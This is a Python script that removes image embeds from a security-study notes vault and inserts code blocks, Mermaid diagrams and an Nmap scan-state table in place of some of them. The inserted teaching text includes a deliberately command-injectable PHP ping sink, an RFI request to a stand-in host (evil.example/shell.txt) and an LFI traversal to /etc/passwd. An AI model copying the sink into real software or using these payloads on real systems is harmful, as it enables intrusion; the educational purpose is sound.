#!/usr/bin/env python3
"""
Remove every image embed from the vault, rescuing the content worth keeping.

Three outcomes per embed:
  REPLACE  a screenshot of generic code  -> a real fenced code block
  MERMAID  a diagram of a generic concept -> original Mermaid source
  DROP     decoration, third-party lab screenshots, provider-branded graphics

Nothing sourced from a training provider's rooms is transcribed. Those
screenshots carry that provider's flags, hostnames and paths; re-typing them as
text would preserve their lab content in a public repo as searchable text, which
is a worse position than the screenshot was. Those notes need original synthetic
examples instead — tracked separately.

    python3 docs/scripts/strip-images.py            # dry run
    python3 docs/scripts/strip-images.py --apply
"""

import os
import re
import sys
import collections

# docs/ is excluded: its ![[...]] occurrences are syntax examples inside the
# Authoring Standard and the Room Template, rewritten by hand.
SKIP_DIRS = {".git", ".obsidian", "assets", "graphify-out", ".claude", ".archive", "docs"}
SKIP_FILES = {"AGENTS.md", "CONTRIBUTION.md"}

WEBEXP = "Application Security/Web Exploitation.md"
NMAP = ("Tooling & Scripting/Tooling/Offensive Tools/Network Discovery Tools/Nmap.md")
ETH = "Networking/Switching & the Link Layer/Ethernet & Frame Structure.md"

# The Nmap SVG carried a scan-type/reply/state matrix that appears nowhere else
# in the note. Deleting it without this would lose real content.
NMAP_TABLE = '''```mermaid
sequenceDiagram
    participant S as Scanner
    participant P as Target port
    S->>P: SYN — can I connect?
    P-->>S: SYN-ACK — yes, I'm open
    S->>P: ACK — connection established
```

A scanner never *sees* a port. It infers the state from the reply, or from the
silence:

| Scan | reply = OPEN | reply = CLOSED | silence means |
|:--|:--|:--|:--|
| SYN `-sS` (half-open) | `SYN-ACK` | `RST` | filtered |
| Connect `-sT` (full) | handshake completes | `RST` | filtered |
| UDP `-sU` | a UDP reply | `ICMP port-unreachable` | `open`&#124;`filtered` |

`filtered` and `open|filtered` are the genuinely hard results, because silence is
ambiguous — a firewall dropping the probe is indistinguishable from a lost
packet. That is why UDP scanning is slow and uncertain, and why a surprising
state always needs a second technique to confirm. `-sS` sends `RST` instead of
the final `ACK`, so the connection never completes and the application never logs
a session; `-sT` needs no privileges but completes the handshake, and the
application sees it.'''

ETH_PROSE_OLD = ("The diagram above is worth studying before reading further: the top bar is "
                 "the frame as it exists on the wire, and the bottom panel is that *same* "
                 "structure as it appears in a real `tcpdump` hex dump. Being able to move "
                 "between those two views — the abstract field map and the actual bytes — is "
                 "the skill this note builds, and Task 3 does exactly that against a live "
                 "capture.")
ETH_PROSE_NEW = ("Being able to move between those two views — the abstract field map above "
                 "and the actual bytes on the wire — is the skill this note builds, and Task 3 "
                 "does exactly that against a live capture.")

PING_CODE = '''```php
<!-- The pattern attribute is a client-side hint. It is not a control:
     the request can be sent without a browser at all. -->
<input type="text" id="ping" name="ping" pattern="[0-9]+">

<?php
// The sink: user input concatenated straight into a shell string.
echo passthru("/bin/ping -c 4 " . $_GET["ping"]);
?>
```

Two separate failures sit in four lines. The `pattern` attribute is enforced by
the browser and by nothing else, so `curl` ignores it entirely. And `passthru`
hands its argument to a shell, so `;` or `&&` inside `ping` starts a second
command with the web server's privileges.'''

FILTER_CODE = '''```php
<?php
// Server-side validation is the only kind that counts.
if (!filter_input(INPUT_GET, "number", FILTER_VALIDATE_INT)) {
    http_response_code(400);
    exit("invalid input");
}
```

Note the constant: `FILTER_VALIDATE_INT`, not a general "number" filter — PHP
offers `FILTER_VALIDATE_INT` and `FILTER_VALIDATE_FLOAT`, and naming the wrong
one silently returns `false` for every input, which reads like working
validation while rejecting everything.'''

LFI_RFI_MERMAID = '''```mermaid
sequenceDiagram
    participant A as Attacker
    participant W as Web Application
    participant S as Server
    participant E as External Server
    note over A,E: RFI — the payload arrives from outside
    A->>W: ?page=http://evil.example/shell.txt
    W->>E: fetches the remote file
    E-->>W: returns attacker-controlled code
    W->>S: includes and executes it (RCE)
    note over A,S: LFI — the payload must already be on disk
    A->>W: ?page=../../../../etc/passwd
    W->>S: reads a local file
    S-->>W: returns its content
    W->>S: escalates to execution via a writable or log-poisoned path
```

The two differ in one respect that decides how hard each is to exploit: RFI needs
the application to fetch a URL, so disabling remote includes kills it outright.
LFI needs the attacker to first get their content onto the disk — through an
upload, a log file, or a session store — which is why LFI writeups so often begin
with something that looks unrelated to file inclusion.'''

SERIAL_MERMAID = '''```mermaid
flowchart LR
    O["Live object<br/>in memory"] -->|serialize| B["Stream of bytes"]
    B --> F["File"]
    B --> D["Database"]
    B --> N["Cookie / cache / network"]
    F --> B2["Stream of bytes"]
    D --> B2
    N --> B2
    B2 -->|deserialize| O2["Object reconstructed<br/>— constructors and magic methods run"]
    style O2 fill:#3a0f1a,stroke:#e6194b,color:#fff
```

The right-hand side is where the vulnerability lives. Deserialization does not
just copy data into a struct — it *instantiates* objects, and in doing so runs
whatever the language runs on object creation. An attacker who controls the byte
stream therefore controls which classes get built, which is the foothold a gadget
chain needs.'''

REPLACE = {
    WEBEXP: [
        ("![[14acf436361fcfb7efced4b2f416b3d5.png]]", PING_CODE),
        ("> ![[06e83dfe3791664ed0bb9bc9ffd3e581.png]]", FILTER_CODE),
        ("![[51fca7adb2f8deb2d2bd3a83dc4d0c00.png]]", LFI_RFI_MERMAID),
        ("![[25179cc30d19a77dc77167e9d5ad7cd9.png]]\n![[9a199439b155641fc89ddfd09376ca62.png]]",
         SERIAL_MERMAID),
    ],
    NMAP: [("![[tool_port_scan_states.svg]]", NMAP_TABLE)],
    ETH: [(ETH_PROSE_OLD, ETH_PROSE_NEW)],
}

# Sentences that only make sense with a figure present.
FIG_PROSE = [
    re.compile(r"^Read the diagram before any flag: [^\n]*\n", re.M),
    re.compile(r"^[^\n]*\b(the diagram above|the image above|the figure above|"
               r"the diagram below|the image below|shown in the diagram)\b[^\n]*\n", re.M | re.I),
]

EMBED_LINE = re.compile(r"^[ \t>]*!\[\[[^\]]+\]\][ \t]*\n", re.M)
EMBED_ANY = re.compile(r"!\[\[[^\]]+\]\]")


def process(text, rel):
    stats = collections.Counter()
    for old, new in REPLACE.get(rel, []):
        if old in text:
            text = text.replace(old, new, 1)
            stats["rescued"] += 1
    n = len(EMBED_ANY.findall(text))
    if n:
        text = EMBED_LINE.sub("", text)
        for e in EMBED_ANY.findall(text):   # inline embeds, not on their own line
            text = text.replace(e, "")
        stats["dropped"] += n
    for pat in FIG_PROSE:                   # drop sentences that point at a gone figure
        text, k = pat.subn("", text)
        stats["prose"] += k
    text = re.sub(r"\n{3,}", "\n\n", text)
    return text, stats


def main():
    apply = "--apply" in sys.argv
    total = collections.Counter()
    rows = []
    for dp, dn, fn in os.walk("."):
        dn[:] = [d for d in dn if d not in SKIP_DIRS]
        for f in sorted(fn):
            if not f.endswith(".md") or f in SKIP_FILES:
                continue
            p = os.path.join(dp, f)
            rel = os.path.relpath(p, ".")
            src = open(p, encoding="utf-8").read()
            if "![[" not in src and rel not in REPLACE:
                continue
            out, st = process(src, rel)
            if out == src:
                continue
            rows.append((rel, st))
            total.update(st)
            if apply:
                open(p, "w", encoding="utf-8").write(out)

    print(f"=== image strip — {'APPLIED' if apply else 'DRY RUN'} ===\n")
    print(f"notes changed      {len(rows)}")
    print(f"embeds rescued     {total['rescued']}  (code blocks + Mermaid + tables)")
    print(f"embeds dropped     {total['dropped']}")
    print(f"stale figure lines {total['prose']}\n")
    for rel, st in rows:
        if st["rescued"] or st["prose"]:
            print(f"  rescued {st['rescued']:>2}  dropped {st['dropped']:>2}  "
                  f"prose {st['prose']:>2}   {rel}")
    print(f"  ... plus {sum(1 for _, s in rows if not (s['rescued'] or s['prose']))} "
          f"notes with embeds dropped only")
    if not apply:
        print("\nRe-run with --apply to write.")
    return 0


if __name__ == "__main__":
    sys.exit(main())
